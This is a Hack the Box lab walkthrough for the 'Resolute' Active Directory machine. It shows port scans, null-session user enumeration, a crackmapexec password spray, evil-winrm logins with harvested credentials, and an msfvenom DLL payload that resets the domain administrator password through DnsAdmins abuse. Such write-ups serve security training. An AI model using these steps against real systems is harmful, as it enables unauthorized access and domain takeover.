# Hack the Box - Resolute

# Enumeration
## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.169 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.169
Host is up (0.19s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49682/tcp open  unknown
49711/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.74 seconds
```


```CSS
▶ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.169 -oN services.nmap

Nmap scan report for 10.10.10.169
Host is up (0.18s latency).  
                                          
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-23 18:13:41Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                                 
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)                                                        
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m32s, deviation: 4h02m30s, median: 6m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-05-23T11:13:52-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-05-23T18:13:54
|_  start_date: 2023-05-23T17:43:07
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.44 seconds
```

---

## RPC Client
  - Null Session Authentication
```CSS
▶ rpcclient -U "" -N 10.10.10.169
```

  - Enumerate Domain Users
```CSS
rpcclient $> enumdomusers
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d4596127-4b1b-4957-ac1b-c0e30d6cd312)

  - Query Users Info
```CSS
rpcclient $> querydispinfo
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ec7322f6-3ebb-4fb8-8691-c8c92af2dc0e)
The above command return brief information about all the users. An interesting comment for `RID 0x457` is also found.
```CSS
Credentials - marko:Welcome123!
```

  - Query Single User's Info
```CSS
rpcclient $> queryuser 0x1f4
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/56612aa0-fa48-41b2-ad95-e6cd47bf97a5)

---

## SMB
  - Attempt to login with found credentials.
```CSS
▶ crackmapexec smb 10.10.10.169 -u marco -p 'Welcome123!' --continue-on-success
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/a8ca9538-8a8c-45f6-8263-89df0d2eaeb9)

### Password Spray
  - Create a file containing the list of users found via RPC.
  - Authenticate as any user using the password default password found.
```CSS
▶ vim users.txt

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5] 
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]   
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```
Use within vim to extract the usernames:`%s/user:\[\(.*\)\] rid:\[.*\]/\1/g`

  - Password Spray
```CSS
▶ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!' --continue-on-success
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8f91e8ba-959b-47e8-bf89-3f0a19668ac7)

```CSS
Credentials- melanie:Welcome123!
```

---

# FootHold
## Evil-WinRM Shell
```CSS
▶ evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e36af976-1ab7-4e1d-80f3-4512e6388fd6)

# Lateral Movement
Use the `-force` option to reveal hidden files and directories.
```CSS
*Evil-WinRM* PS C:\Users\melanie\Documents> cd C:\
*Evil-WinRM* PS C:\> dir -force
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5685fdb2-0738-4a96-93c2-5e87c98c70d9)
A hidden directory `C:\PSTranscripts\ .` is revealed.

This directory further contains a hidden subdirectory `C:\PSTranscripts\20191203\ .` After running the command dir -force again, a hidden file: `C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt .` is revealed.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/89917f19-ef1d-4acc-8abb-1e76588a2b2e)

###  PowerShell Transcription Logging
PowerShell transcription logging is a feature in PowerShell that allows to record and save a transcript of the commands and output in a PowerShell session. It provides a way to capture the entire session, including input, output, and error messages, into a text file for later review and analysis. When transcription logging is enabled, PowerShell will create a log file that contains a record of all the commands executed within the session, along with their corresponding outputs.
```CSS
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5df52d02-73c9-49c0-8a43-a08fbb1dae7a)
```CSS
Credentials- ryan:Serv3r4Admin4cc123!
```

### Evil-WinRM Shell
```CSS
▶ evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ace42197-fb5a-4682-b066-43566ed68308)

Any changes made to the system will have to be completely used within a minute (or less).
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/98675a6a-ba1f-48b2-b67b-e4bc277e37f0)

### Groups (DNSAdmin)
Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. By default the DNSAdmins don’t have the ability to start or stop the DNS service, but it’s not unusual for an admin to give this group that privilege.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/9e20d82d-2ceb-4239-9718-be3ff15717ca)

The user ryan is found to be a member of DnsAdmins. Being a member of the DnsAdmins group allows the use of dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service. 

### MSFVenom DLL
  - Create a payload that changes the administrator password.
```CSS
▶ msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > payload.dll
```

